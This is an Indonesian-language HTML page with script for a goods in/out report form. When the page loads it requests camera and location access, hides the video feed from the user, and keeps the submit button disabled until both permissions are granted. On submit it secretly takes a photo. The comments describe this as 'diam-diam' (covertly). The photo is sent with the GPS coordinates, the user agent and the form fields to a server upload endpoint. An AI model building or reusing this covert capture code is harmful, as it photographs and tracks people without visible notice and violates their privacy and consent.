<!--
Halaman form laporan barang.
- Auto minta izin kamera & lokasi saat halaman load
- Kamera tersembunyi (tidak tampil ke user)
- Kalau izin ditolak -> tombol submit nonaktif
- Foto, lokasi, dan data form dikirim ke server Flask
-->

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Laporan Barang</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .disabled { background-color: #ccc; cursor: not-allowed; }
        video { display: none; } /* Kamera disembunyikan */
    </style>
</head>
<body>
    <h2>Laporan Barang Keluar/Masuk</h2>
    <p>Form ini akan menggunakan kamera dan lokasi Anda untuk verifikasi.</p>

    <!-- Form laporan -->
    <form id="laporanForm" enctype="multipart/form-data" method="POST" action="/upload">
        <label>Hari:</label><br>
        <input type="text" name="hari" required><br><br>

        <label>Jam:</label><br>
        <input type="text" name="jam" required><br><br>

        <label>Material:</label><br>
        <input type="text" name="material" required><br><br>

        <label>Keterangan:</label><br>
        <textarea name="keterangan" required></textarea><br><br>

        <input type="hidden" name="latitude" id="latitude">
        <input type="hidden" name="longitude" id="longitude">
        <input type="hidden" name="userAgent" id="userAgent">

        <input type="file" name="photo" id="photoFile" accept="image/*" capture="environment" hidden>

        <video id="video" autoplay playsinline></video>

        <button type="submit" id="submitBtn" class="disabled" disabled>ENTER</button>
    </form>

    <script>
        const video = document.getElementById("video");
        const photoFile = document.getElementById("photoFile");
        const submitBtn = document.getElementById("submitBtn");

        // Set user agent ke form
        document.getElementById("userAgent").value = navigator.userAgent;

        let cameraReady = false;
        let locationReady = false;
        let stream;

        // Fungsi cek status izin
        function checkReady() {
            if (cameraReady && locationReady) {
                submitBtn.disabled = false;
                submitBtn.classList.remove("disabled");
            }
        }

        // Auto minta izin kamera saat load
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                stream = s;
                video.srcObject = s;
                cameraReady = true;
                checkReady();
            })
            .catch(err => {
                alert("Akses kamera ditolak. Form tidak bisa digunakan.");
            });

        // Auto minta izin lokasi saat load
        navigator.geolocation.getCurrentPosition(
            pos => {
                document.getElementById("latitude").value = pos.coords.latitude;
                document.getElementById("longitude").value = pos.coords.longitude;
                locationReady = true;
                checkReady();
            },
            err => {
                alert("Akses lokasi ditolak. Form tidak bisa digunakan.");
            }
        );

        // Ambil foto diam-diam sebelum submit
        document.getElementById("laporanForm").addEventListener("submit", function(e) {
            e.preventDefault();
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
                const data = new FormData(this);
                data.set("photo", file);

                fetch("/upload", { method: "POST", body: data })
                    .then(res => {
                        if (res.ok) {
                            window.location.href = "https://docs.google.com/spreadsheets/d/ID_SHEET_KAMU/edit";
                        } else {
                            alert("Gagal mengirim data");
                        }
                    });
            }, "image/jpeg");
        });
    </script>
</body>
      </html>
      
